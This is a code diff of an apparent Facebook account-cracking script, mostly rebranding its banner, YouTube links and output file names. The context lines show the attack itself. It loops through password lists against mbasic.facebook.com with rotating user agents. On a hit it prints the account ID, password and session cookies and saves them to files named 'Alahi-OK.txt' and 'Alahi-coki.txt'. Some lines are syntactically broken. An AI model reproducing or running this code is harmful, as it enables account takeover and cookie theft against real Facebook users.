@@ -229,22 +229,25 @@ for xd in range(10000):
 logo =                                          ("""   
 ┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
 ┃
-     
+   
+ 
+   
 ██      ██    ██ ██   ██ 
 ██      ██    ██  ██ ██  
 ██      ██    ██   ███   
 ██      ██    ██  ██ ██  
 ███████  ██████  ██   ██ 
-                                                                                                            
+                         
+                            
 ┃
 └━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
   
-    ┌━━━━━━━━━━━━━━━━━ ALAHI ━━━━━━━━━━━━━━━━━━┑
+    ┌━━━━━━━━━━━━━━━━━ Alahi ━━━━━━━━━━━━━━━━━━┑
                \033[1;97mCREATED BY   :  ALAHI_H4CKER            
                \033[1;91mFACEBOK      :  Fazla Alahi              
-               \033[1;97mGITHUB       :  HACKER-X_AKASH       
+               \033[1;97mGITHUB       :  HACKER-X_ALAHI       
                \033[1;91mSTATUS       :   𝑭𝑹𝑬𝑬😴            
-               \033[1;97mTEAM         :  Fazla Alahi           
+               \033[1;97mTEAM         :  FAZLA ALAHI              
                \033[1;91mTOOL VIRSION :  𝟷𝟶.2                    
                \033[1;97mTOOL WORK    :  ONLY  DATA           
       └━━━━━━━━━━━━━━━━━ 𝑯𝑨𝑪𝑲𝑬𝑹-𝑿 ━━━━━━━━━━━━━━━━━┘
@@ -274,15 +277,15 @@ def menu():
 	print ("\033[1;97m[3]\033[1;33m CRACK FILE")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
-		os.system('xdg-open https://www.youtube.com/ALAHI)
+		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
 		crack_file()
 		
 	if ot == '2':
-		os.system('xdg-open https://www.youtube.com/ALAHI)
+		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
 		rndm(01)
 		
 	if ot == '3':
-		os.system('xdg-open https://www.youtube.com/ALAHI)
+		os.system('xdg-open https://www.youtube.com/@Cyber-tech539')
 		
 	else:
 		menu()
@@ -299,13 +302,13 @@ def menu1():
 	print ("\033[1;97m     [3]\033[1;33m MY YOUTUBE CHANEL")
 	ot = input('\n   \x1b[1;32m Choose option >>> ')
 	if ot == '1':
-		os.system('xdg-open https://www.youtube.com/ALAHI)
+		os.system('xdg-open https://youtube.com/@indiaseries420?si=spiZpED7aYy2pQdy')
 		crack_file()
 	if ot == '2':
-		os.system('xdg-open https://www.youtube.cm/ALAHI)
+		os.system('xdg-open https://youtube.com/@indiaseries420?si=spiZpED7aYy2pQdy')
 		rndm()
 	if ot == '3':
-		os.system('xdg-open https://www.youtube.com/ALAHI)
+		os.system('xdg-open https://youtube.com/@indiaseries420?si=spiZpED7aYy2pQdy')
 
 	else:
 		menu()
@@ -376,7 +379,7 @@ def c(uid,pwx,ln):
         for ps in pwx:
             session = requests.Session()
             wa = random.choice(my_color)
-            sys.stdout.write(f'\r%s[𝙰𝙺𝙰𝚂𝙷-𝙷𝙰𝙲𝙺𝙴𝚁] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
+            sys.stdout.write(f'\r%s[Alahi-𝙷𝙰𝙲𝙺𝙴𝚁] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
@@ -416,10 +419,10 @@ def c(uid,pwx,ln):
             #	botok(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[65:80]
-            	print('\033[1;92mALAHI-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
+            	print('\033[1;92mAlahi-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
             	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('ALAHI-OK.txt', 'a').write( cid+' | '+ps+'\n')
-            	open('ALAHI-coki.txt', 'a').write(coki+'\n')
+            	open('Alahi-OK.txt', 'a').write( cid+' | '+ps+'\n')
+            	open('Alahi-coki.txt', 'a').write(coki+'\n')
             	cek_apk(session,coki)
             	oks.append(cid)
             	break
@@ -427,9 +430,9 @@ def c(uid,pwx,ln):
             	#botcp(uid,ps)
             	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
             	cid = coki[82:97]
-            	print('\33[1;30m(ALAHI-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
+            	print('\33[1;30m(Alahi-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
             	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
-            	open('ALAHI-CP.txt', 'a').write( uid+' | '+ps+' \n')
+            	open('Alahi-CP.txt', 'a').write( uid+' | '+ps+' \n')
             	cps.append(cid)
             	break
             else:
@@ -525,9 +528,9 @@ def passwrd():
     
 	
 	
-nam = "ALAHI"
-name = "[ALAHI-OK]"
-name1 = "[ALAHI-CP]"
+nam = "Alahi"
+name = "[Alahi-OK]"
+name1 = "[Alahi-CP]"
 	
 def crack(idf,pwv):
 	global loop,ok,cp
